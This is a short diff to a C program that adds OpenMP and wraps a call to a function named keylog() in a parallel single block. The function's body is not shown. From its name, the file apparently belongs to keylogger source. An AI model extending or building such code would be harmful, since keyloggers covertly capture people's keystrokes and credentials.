@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
+#include <omp.h>
 
 void keylog()
 {
@@ -22,6 +23,12 @@ void keylog()
 
 int main()
 {
-    keylog();
+    #pragma omp parallel
+    {
+        #pragma omp single
+        {
+            keylog();
+        }
+    }
     return 0;
 }
